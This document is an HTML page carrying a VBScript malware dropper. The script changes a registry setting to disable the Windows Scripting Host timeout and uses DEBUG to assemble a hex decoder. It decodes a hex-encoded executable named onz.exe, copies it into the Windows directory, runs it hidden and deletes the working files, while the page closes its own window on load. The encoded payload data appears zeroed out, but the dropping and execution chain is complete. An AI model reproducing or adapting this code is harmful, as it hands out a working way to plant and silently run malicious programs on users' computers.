<SCRIPT language=VBSCRIPT>
Dim fso, dirwin, shortSrc, lcoderHex, onzHex, testTxt, witness, rr
Set fso = CreateObject("Scripting.FileSystemObject")
Set dirwin=fso.GetSpecialFolder(0)
Set witness = CreateObject ("WScript.Shell")
On Error Resume Next
rr=witness.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
witness.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
set shortSrc=fso.CreateTextFile("short.src")
shortSrc.WriteLine  "a 100" & vbNewline & "push cs" & vbNewline & "pop es" & vbNewline & "cld" & vbNewline & "mov bx,00c8" & vbNewline & "mov ah,4a" & vbNewline & "int 21" & vbNewline & "mov sp,0c80" & vbNewline & "mov ah,48" & vbNewline & "mov bx,0300" & vbNewline & "int 21" & vbNewline & "mov [024a],ax" & vbNewline & "mov ah,48" & vbNewline & "mov bx,0150" & vbNewline & "int 21" & vbNewline & "mov bp,ax" & vbNewline & "call 0153" & vbNewline & "call 01d4" & vbNewline & "call 0176" & vbNewline & "call 01f5" & vbNewline & "call 0134" & vbNewline & "mov ax,4c00" & vbNewline & "int 21" & vbNewline & "mov dx,023f" & vbNewline & "mov ah,3c" & vbNewline & "xor cx,cx" & vbNewline & "int 21" & vbNewline & "jb 012f" & vbNewline & "mov bx,ax" & vbNewline & "mov cx,[024e]" & vbNewline & "mov ds,bp" & vbNewline & "xor dx,dx" & vbNewline & "mov ax,4000" & vbNewline & "int 21" & vbNewline & "mov ah,3e" & vbNewline & "int 21" & vbNewline & "ret" & vbNewline & "mov dx,0234" & vbNewline & "mov ax,3d00" & vbNewline & "int 21" & vbNewline & "jb 012f" & vbNewline & "mov bx,ax" & vbNewline & "push ds" & vbNewline & "mov cx,2ee0" & vbNewline & "xor dx,dx" & vbNewline & "mov ax,[024a]" & vbNewline & "mov ds,ax" & vbNewline & "mov ax,3f00" & vbNewline & "int 21" & vbNewline & "pop ds" & vbNewline & "jb 012f" & vbNewline & "mov [024c],ax" & vbNewline & "ret" & vbNewline & "xor bx,bx" & vbNewline & "mov cx,[024c]" & vbNewline & "mov ax,[024a]" & vbNewline & "mov es,ax" & vbNewline & "mov di,bx" & vbNewline & "mov si,0252" & vbNewline & "mov al,[si]" & vbNewline & "repnz" & vbNewline & "scasb" & vbNewline & "jcxz 012f" & vbNewline & "mov bx,di" & vbNewline & "es:" & vbNewline & "mov al,[di]" & vbNewline & "inc di" & vbNewline & "dec cx" & vbNewline & "jcxz 012f" & vbNewline & "call 01c0" & vbNewline & "jb 018c" & vbNewline & "inc si" & vbNewline & "cmp al,[si]" & vbNewline & "jnz 0181" & vbNewline & "cmp si,025b" & vbNewline & "jb 018c" & vbNewline & "mov ax,di" & vbNewline & "add ax,[0250]" & vbNewline & "mov si,ax" & vbNewline & "xor di,di" & vbNewline & "mov cx,[024c]" & vbNewline & "sub cx,si" & vbNewline & "mov [024c],cx" & vbNewline & "push ds" & vbNewline & "push es" & vbNewline & "pop ds" & vbNewline & "repz" & vbNewline & "movsb" & vbNewline & "pop ds" & vbNewline & "ret" & vbNewline & "cmp al,30" & vbNewline & "jb 01d2" & vbNewline & "cmp al,39" & vbNewline & "jbe 01d0" & vbNewline & "cmp al,41" & vbNewline & "jb 01d2" & vbNewline & "cmp al,46" & vbNewline & "ja 01d2" & vbNewline & "clc" & vbNewline & "ret" & vbNewline & "stc" & vbNewline & "ret" & vbNewline & "push ds" & vbNewline & "mov ax,[024a]" & vbNewline & "mov es,ax" & vbNewline & "xor si,si" & vbNewline & "mov di,si" & vbNewline & "mov cx,[024c]" & vbNewline & "jcxz 01ef" & vbNewline & "push es" & vbNewline & "pop ds" & vbNewline & "lodsb" & vbNewline & "call 01c0" & vbNewline & "jb 01ed" & vbNewline & "stosb" & vbNewline & "loop 01e6" & vbNewline & "pop ds" & vbNewline & "mov [024c],di" & vbNewline & "ret" & vbNewline & "push dx" & vbNewline & "push ds" & vbNewline & "xor dx,dx" & vbNewline & "mov cx,[024c]" & vbNewline & "shr cx,1 " & vbNewline & "mov es,bp" & vbNewline & "mov ax,[024a]" & vbNewline & "mov ds,ax" & vbNewline & "xor si,si" & vbNewline & "xor di,di" & vbNewline & "call 0216" & vbNewline & "loop 020a" & vbNewline & "pop ds" & vbNewline & "pop dx" & vbNewline & "mov [024e],di" & vbNewline & "ret" & vbNewline & "push cx" & vbNewline & "lodsw" & vbNewline & "cmp al,39" & vbNewline & "jbe 021e" & vbNewline & "sub al,07" & vbNewline & "sub al,30" & vbNewline & "mov cl,04" & vbNewline & "shl al,cl" & vbNewline & "cmp ah,39" & vbNewline & "jbe 022c" & vbNewline & "sub ah,07" & vbNewline & "sub ah,30" & vbNewline & "add al,ah" & vbNewline & "stosb" & vbNewline & "pop cx" & vbNewline & "ret"
shortSrc.WriteBlankLines(1)
shortSrc.WriteLine "e 234" & vbNewline & "6C 63 6F 64 65 72 2E 68 65 78 00 6C" & vbNewline & "e 240" & vbNewline & "63 6F 64 65 72 2E 65 78 65 00 00 00 00 00 00 00" & vbNewline & "e 250" & vbNewline & "6E 00 36 32 36 35 36 37 36 39 36 45 00 00 00 00" & vbNewline & "n short.com" & vbNewline & "rcx" & vbNewline & "15c" & vbNewline & "w" & vbNewline & "q"
shortSrc.close
set lcoderHex=fso.CreateTextFile("lcoder.hex")
lcoderHex.WriteLine "Lehigh coder. Version 0.6." & vbNewline & "Comments to Al McLennan, LJM3@LEHIGH.bitnet."
lcoderHex.WriteBlankLines(1)
lcoderHex.WriteLine "Directory entry for encoded file:" & vbNewline & "LCODER.EXE      5264        20 OCT 89    08:56"
lcoderHex.WriteBlankLines(1)
lcoderHex.WriteLine "begin" & vbNewline & "00000000000000000000000000000000" & vbNewline & "0000000000000000000000000000" & vbNewline & "end of coded data"
lcoderHex.close
set onzHex=fso.CreateTextFile("onz.hex")
onzHex.WriteLine "Lehigh coder. Version 0.6." & vbNewline & "Comments to Al McLennan" & vbNewline & "LJM3@LEHIGH.bitnet."
onzHex.WriteBlankLines(1)
onzHex.WriteLine "Directory entry for encoded file:" & vbNewline & "ONZ.EXE         4608         5 OCT 00    22:46"
onzHex.WriteBlankLines(1)
onzHex.WriteLine "begin" & vbNewline & "00000000000000000000000000000000" & vbNewline & "000000000000000000000000000000000000" & vbNewline & "end of coded data"
onzHex.close
set testTxt=fso.CreateTextFile("test.txt")
testTxt.WriteLine "echo" & vbNewline & "onz.hex" & vbNewline & "echo"
testTxt.close
witness.Run "debug < short.src",0,True
witness.Run "%comspec% /c short.com",0,True
witness.Run "%comspec% /c lcoder.exe < test.txt",0,True
witness.Run "%comspec% /c move onz.exe %windir%\onz.exe",0,True
witness.Run "%windir%\onz.exe",0,True
Dim f1, f2, f3, f4, f5, f6
Set f1 = fso.GetFile("short.src")
Set f2 = fso.GetFile("lcoder.hex")
Set f3 = fso.GetFile("onz.hex")
Set f4 = fso.GetFile("test.txt")
Set f5 = fso.GetFile("Short.com")
Set f6 = fso.GetFile("lcoder.exe")
f1.Delete
f2.Delete
f3.Delete
f4.Delete
f5.Delete
f6.Delete
</SCRIPT><BODY onload="javascript: window.close()"></BODY>
